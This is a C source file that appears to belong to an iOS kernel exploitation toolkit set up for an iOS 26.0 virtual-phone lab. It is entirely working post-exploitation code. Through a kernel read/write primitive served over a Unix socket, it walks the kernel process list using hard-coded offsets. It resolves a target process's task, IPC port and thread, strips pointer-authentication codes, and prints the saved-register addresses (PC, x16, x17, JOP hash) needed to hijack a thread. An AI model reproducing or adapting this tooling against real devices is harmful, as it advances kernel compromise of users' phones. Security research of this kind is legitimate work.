#include "CNDLabKernelProtocol.h"

#include <errno.h>
#include <inttypes.h>
#include <mach/mach.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>

/* Exact iOS 26.0 23A341 vPhone layout. */
static const uint64_t CNDStaticAllProc = UINT64_C(0xfffffe0009813020);
static const uint64_t CNDZoneMin = UINT64_C(0xfffffe1000000000);
static const uint64_t CNDZoneMax = UINT64_C(0xfffffe3fffffffff);
static const uint64_t CNDProcROOffset = UINT64_C(0x18);
static const uint64_t CNDProcPIDOffset = UINT64_C(0x60);
static const uint64_t CNDProcROTaskOffset = UINT64_C(0x8);
static const uint64_t CNDTaskIPCSpaceOffset = UINT64_C(0x310);
static const uint64_t CNDIPCSpaceTableOffset = UINT64_C(0x48);
static const uint64_t CNDIPCEntrySize = UINT64_C(0x18);
static const uint64_t CNDPortKobjectOffset = UINT64_C(0x50);
static const uint64_t CNDThreadContextDataOffset = UINT64_C(0xf8);
static const uint64_t CNDThreadUPCBOffset = UINT64_C(0x100);
static const uint64_t CNDThreadUNeonOffset = UINT64_C(0x108);
static const uint64_t CNDARMContextNeonOffset = UINT64_C(0x130);
static const uint64_t CNDSavedStateX16Offset = UINT64_C(0x88);
static const uint64_t CNDSavedStateX17Offset = UINT64_C(0x90);
static const uint64_t CNDSavedStatePCOffset = UINT64_C(0x108);
static const uint64_t CNDSavedStateJOPHashOffset = UINT64_C(0x128);

static int transfer_all(int fd, void *buffer, size_t size, int writing)
{
    uint8_t *cursor = buffer;
    while (size != 0) {
        ssize_t amount = writing
            ? write(fd, cursor, size) : read(fd, cursor, size);
        if (amount == 0) return ECONNRESET;
        if (amount < 0) {
            if (errno == EINTR) continue;
            return errno != 0 ? errno : EIO;
        }
        cursor += (size_t)amount;
        size -= (size_t)amount;
    }
    return 0;
}

static int request(int fd, uint32_t operation, uint64_t address,
                   void *buffer, size_t length, uint64_t *value)
{
    CNDLabKRWRequest message = {
        .magic = CND_LAB_KRW_MAGIC,
        .version = CND_LAB_KRW_VERSION,
        .operation = operation,
        .length = (uint32_t)length,
        .address = address,
    };
    int result = transfer_all(fd, &message, sizeof(message), 1);
    CNDLabKRWResponse response = {0};
    if (result == 0) result = transfer_all(fd, &response, sizeof(response), 0);
    if (result == 0 && (response.magic != CND_LAB_KRW_MAGIC ||
        response.status != 0 ||
        (operation == CNDLabKRWOperationRead && response.length != length))) {
        result = response.status != 0 ? response.status : EPROTO;
    }
    if (result == 0 && operation == CNDLabKRWOperationRead && length != 0) {
        result = transfer_all(fd, buffer, length, 0);
    }
    if (result == 0 && value != NULL) *value = response.value;
    return result;
}

static int kernel_read(int fd, uint64_t address, void *buffer, size_t length)
{
    uint8_t *cursor = buffer;
    while (length != 0) {
        size_t amount = length > CND_LAB_KRW_MAX_TRANSFER
            ? CND_LAB_KRW_MAX_TRANSFER : length;
        int result = request(fd, CNDLabKRWOperationRead, address,
                             cursor, amount, NULL);
        if (result != 0) return result;
        address += amount;
        cursor += amount;
        length -= amount;
    }
    return 0;
}

__attribute__((naked))
static uint64_t strip_data_pointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}

static int kernel_object(uint64_t value)
{
    return value >= CNDZoneMin && value <= CNDZoneMax && (value & 7) == 0;
}

static int kernel_static(uint64_t value)
{
    return (value & UINT64_C(0xffff000000000000)) ==
        UINT64_C(0xffff000000000000);
}

static int read_pointer(int fd, uint64_t address, uint64_t *raw_out,
                        uint64_t *pointer_out)
{
    uint64_t raw = 0;
    int result = kernel_read(fd, address, &raw, sizeof(raw));
    uint64_t pointer = strip_data_pointer(raw);
    if (raw_out != NULL) *raw_out = raw;
    if (pointer_out != NULL) *pointer_out = pointer;
    if (result != 0) return result;
    return kernel_object(pointer) ? 0 : EILSEQ;
}

static uint64_t find_process(int fd, uint64_t head, uint32_t wanted_pid,
                             uint32_t *visited_out)
{
    uint64_t process = strip_data_pointer(head);
    uint32_t visited = 0;
    for (; visited < 1024 && kernel_object(process); visited++) {
        uint8_t header[0x64] = {0};
        if (kernel_read(fd, process, header, sizeof(header)) != 0) break;
        uint32_t pid = 0;
        memcpy(&pid, header + CNDProcPIDOffset, sizeof(pid));
        if (pid == wanted_pid) {
            if (visited_out != NULL) *visited_out = visited + 1;
            return process;
        }
        uint64_t raw_next = 0;
        memcpy(&raw_next, header, sizeof(raw_next));
        uint64_t next = strip_data_pointer(raw_next);
        if (next == process) break;
        process = next;
    }
    if (visited_out != NULL) *visited_out = visited;
    return 0;
}

static uint64_t task_for_process(int fd, uint64_t process)
{
    uint64_t proc_ro = 0;
    uint64_t task = 0;
    if (read_pointer(fd, process + CNDProcROOffset, NULL, &proc_ro) != 0 ||
        read_pointer(fd, proc_ro + CNDProcROTaskOffset, NULL, &task) != 0) {
        return 0;
    }
    return task;
}

static uint64_t port_object(int fd, uint64_t task, mach_port_name_t name,
                            uint64_t *space_out, uint64_t *table_out)
{
    uint64_t space = 0;
    if (read_pointer(fd, task + CNDTaskIPCSpaceOffset,
                     NULL, &space) != 0) return 0;
    uint64_t raw_table = 0;
    if (kernel_read(fd, space + CNDIPCSpaceTableOffset,
                    &raw_table, sizeof(raw_table)) != 0) return 0;
    uint64_t table = strip_data_pointer(raw_table) & ~UINT64_C(0x1f);
    uint64_t index = (uint64_t)name >> 8;
    if (!kernel_object(table) ||
        index > (UINT64_MAX - table) / CNDIPCEntrySize) return 0;
    uint64_t object = 0;
    if (read_pointer(fd, table + index * CNDIPCEntrySize,
                     NULL, &object) != 0) return 0;
    if (space_out != NULL) *space_out = space;
    if (table_out != NULL) *table_out = table;
    return object;
}

static int parse_u64(const char *text, uint64_t *value)
{
    if (text == NULL || value == NULL || text[0] == '\0' || text[0] == '-') {
        return EINVAL;
    }
    errno = 0;
    char *end = NULL;
    unsigned long long parsed = strtoull(text, &end, 0);
    if (errno != 0 || end == text || *end != '\0') return EINVAL;
    *value = (uint64_t)parsed;
    return 0;
}

static int connect_provider(const char *path)
{
    if (path == NULL || strlen(path) >=
        sizeof(((struct sockaddr_un *)0)->sun_path)) {
        errno = EINVAL;
        return -1;
    }
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un address = { .sun_family = AF_UNIX };
    strcpy(address.sun_path, path);
    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    return fd;
}

int main(int argc, char **argv)
{
    if (argc != 6) {
        fprintf(stderr, "usage: %s SOCKET EXPECTED_BASE SLIDE PID PORT\n",
                argv[0]);
        return 64;
    }
    uint64_t expected_base = 0;
    uint64_t slide = 0;
    uint64_t pid_value = 0;
    uint64_t port_value = 0;
    if (parse_u64(argv[2], &expected_base) != 0 ||
        parse_u64(argv[3], &slide) != 0 ||
        parse_u64(argv[4], &pid_value) != 0 ||
        parse_u64(argv[5], &port_value) != 0 ||
        !kernel_static(expected_base) || slide >= UINT64_C(0x100000000) ||
        pid_value <= 1 || pid_value > INT32_MAX || port_value > UINT32_MAX) {
        fprintf(stderr, "invalid expected base, slide, pid, or port\n");
        return 64;
    }

    int fd = connect_provider(argv[1]);
    if (fd < 0) {
        fprintf(stderr, "provider connect failed: %s\n", strerror(errno));
        return 1;
    }
    uint64_t capabilities = 0;
    uint64_t base = 0;
    int result = request(fd, CNDLabKRWOperationCapabilities,
                         0, NULL, 0, &capabilities);
    if (result == 0) {
        result = request(fd, CNDLabKRWOperationKBase, 0, NULL, 0, &base);
    }
    if (result != 0 || base != expected_base ||
        (capabilities & CNDLabKRWCapabilityKernelReadWrite) == 0) {
        fprintf(stderr, "provider identity failed result=%d base=%#" PRIx64
                " expected=%#" PRIx64 " capabilities=%#" PRIx64 "\n",
                result, base, expected_base, capabilities);
        close(fd);
        return 2;
    }

    uint64_t allproc_head = 0;
    result = kernel_read(fd, CNDStaticAllProc + slide,
                         &allproc_head, sizeof(allproc_head));
    uint32_t visited = 0;
    uint64_t process = result == 0
        ? find_process(fd, allproc_head, (uint32_t)pid_value, &visited) : 0;
    uint64_t task = process != 0 ? task_for_process(fd, process) : 0;
    uint64_t ipc_space = 0;
    uint64_t ipc_table = 0;
    uint64_t port = kernel_object(task)
        ? port_object(fd, task, (mach_port_name_t)port_value,
                      &ipc_space, &ipc_table) : 0;
    uint64_t raw_thread = 0;
    uint64_t thread = 0;
    uint64_t raw_context_data = 0;
    uint64_t context_data = 0;
    uint64_t raw_upcb = 0;
    uint64_t saved_state = 0;
    uint64_t raw_u_neon = 0;
    uint64_t u_neon = 0;
    if (kernel_object(port)) {
        result = read_pointer(fd, port + CNDPortKobjectOffset,
                              &raw_thread, &thread);
    } else {
        result = EILSEQ;
    }
    if (result == 0) {
        result = read_pointer(fd, thread + CNDThreadContextDataOffset,
                              &raw_context_data, &context_data);
    }
    if (result == 0) {
        result = read_pointer(fd, thread + CNDThreadUPCBOffset,
                              &raw_upcb, &saved_state);
    }
    if (result == 0) {
        result = read_pointer(fd, thread + CNDThreadUNeonOffset,
                              &raw_u_neon, &u_neon);
    }
    uint32_t state_header[2] = {0};
    if (result == 0) {
        result = kernel_read(fd, saved_state, state_header,
                             sizeof(state_header));
    }
    close(fd);
    if (result != 0 || !kernel_object(process) || !kernel_object(task) ||
        !kernel_object(ipc_space) || !kernel_object(ipc_table) ||
        !kernel_object(port) || !kernel_object(thread) ||
        !kernel_object(context_data) || !kernel_object(saved_state) ||
        !kernel_object(u_neon) || context_data != saved_state ||
        u_neon != saved_state + CNDARMContextNeonOffset) {
        fprintf(stderr, "saved-state resolution failed result=%d visited=%u "
                "process=%#" PRIx64 " task=%#" PRIx64 " port=%#" PRIx64
                " thread=%#" PRIx64 " context=%#" PRIx64
                " upcb=%#" PRIx64 " uneon=%#" PRIx64 "\n",
                result, visited, process, task, port, thread,
                context_data, saved_state, u_neon);
        return 3;
    }

    printf("{\"schema\":\"com.zeroxjf.cyanide.thread-saved-state-resolve\","
           "\"schemaVersion\":1,\"kernelBase\":\"%#" PRIx64 "\","
           "\"capabilities\":\"%#" PRIx64 "\",\"pid\":%" PRIu64 ","
           "\"portName\":\"%#" PRIx64 "\",\"visitedProcesses\":%u,"
           "\"process\":\"%#" PRIx64 "\",\"task\":\"%#" PRIx64 "\","
           "\"ipcSpace\":\"%#" PRIx64 "\",\"ipcTable\":\"%#" PRIx64 "\","
           "\"portObject\":\"%#" PRIx64 "\",\"rawThread\":\"%#" PRIx64 "\","
           "\"thread\":\"%#" PRIx64 "\","
           "\"rawContextData\":\"%#" PRIx64 "\","
           "\"contextData\":\"%#" PRIx64 "\",\"rawUPCB\":\"%#" PRIx64 "\","
           "\"savedState\":\"%#" PRIx64 "\",\"savedStateFlavor\":%u,"
           "\"savedStateCount\":%u,\"rawUNeon\":\"%#" PRIx64 "\","
           "\"uNeon\":\"%#" PRIx64 "\",\"layoutExact\":true,"
           "\"x16Address\":\"%#" PRIx64 "\","
           "\"x17Address\":\"%#" PRIx64 "\",\"pcAddress\":\"%#" PRIx64 "\","
           "\"jopHashAddress\":\"%#" PRIx64 "\","
           "\"usedKernelRead\":true,\"usedKernelWrite\":false,"
           "\"usedKernelCall\":false}\n",
           base, capabilities, pid_value, port_value, visited,
           process, task, ipc_space, ipc_table, port, raw_thread, thread,
           raw_context_data, context_data, raw_upcb, saved_state,
           state_header[0], state_header[1], raw_u_neon, u_neon,
           saved_state + CNDSavedStateX16Offset,
           saved_state + CNDSavedStateX17Offset,
           saved_state + CNDSavedStatePCOffset,
           saved_state + CNDSavedStateJOPHashOffset);
    return 0;
}
